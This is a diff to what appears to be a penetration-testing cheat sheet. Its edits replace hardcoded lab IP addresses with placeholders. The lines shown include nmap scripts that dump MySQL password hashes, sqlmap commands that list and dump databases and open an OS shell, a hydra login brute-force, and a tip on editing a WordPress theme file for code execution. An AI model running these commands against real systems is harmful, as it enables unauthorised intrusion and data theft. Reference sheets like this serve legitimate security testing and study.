@@ -489,7 +489,7 @@ nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',passwor
 
 nmap -p 3306 --script=mysql-query --script-args="query='select count(*) from <DB_NAME>.<TABLE_NAME>;',username='<USER>',password='<PW>'" <TARGET_IP>
 
-nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.13
+nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <TARGET_IP>
 
 ## Microsoft SQL
 nmap -sV -sC -p 1433 <TARGET_IP>
@@ -2970,17 +2970,17 @@ sqlmap -r Post.req
 
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title
 
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id          #GET Method
-sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"      #POST Method
+sqlmap -u "http://<TARGET_HOST>/file.php?id=1" -p id          #GET Method
+sqlmap -u "http://<TARGET_HOST>/login.php" --data="user=admin&password=admin"      #POST Method
 ```
 
 #### **Get database if injection Exists**
 
 ```bash
 sqlmap -r login.req --dbs
-sqlmap -u "http://10.10.10.10/file.php?id=1" --dbs    #determine the databases:
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs    #GET Method
-sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs #POST Method
+sqlmap -u "http://<TARGET_HOST>/file.php?id=1" --dbs    #determine the databases:
+sqlmap -u "http://<TARGET_HOST>/file.php?id=1" -p id --dbs    #GET Method
+sqlmap -u "http://<TARGET_HOST>/login.php" --data="user=admin&password=admin" --dbs #POST Method
 
 # List databases
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title --dbs
@@ -2993,23 +2993,23 @@ sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "
 
 ```bash
 sqlmap -r login.req -D dbname --tables    #determine the tables:
-sqlmap -u "http://10.10.10.10/file.php?id=1" -D dbname --common-tables    #if tables not available, guess tables using common names
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables        #GET Method
-sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables #POST Method
+sqlmap -u "http://<TARGET_HOST>/file.php?id=1" -D dbname --common-tables    #if tables not available, guess tables using common names
+sqlmap -u "http://<TARGET_HOST>/file.php?id=1" -p id -D dbname --tables        #GET Method
+sqlmap -u "http://<TARGET_HOST>/login.php" --data="user=admin&password=admin" -D dbname --tables #POST Method
 ```
 
 **Get data in a Database tables**
 
 ```bash
 sqlmap -r login.req -D dbname -T table_name --dump
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
-sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump   #POST Method
+sqlmap -u "http://<TARGET_HOST>/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
+sqlmap -u "http://<TARGET_HOST>/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump   #POST Method
 ```
 
 #### Get OS-Shell
 
 ```bash
-sqlmap -u "http://10.10.10.10/file.php?id=1" --os-shell
+sqlmap -u "http://<TARGET_HOST>/file.php?id=1" --os-shell
 ```
 
 ### **XSS**
@@ -3073,7 +3073,7 @@ hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=
 
 ### Basic Information
 
-**Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
+**Uploaded** files go to: `http://<TARGET_HOST>/wp-content/uploads/2018/08/a.txt`\
 **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
 **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)
 
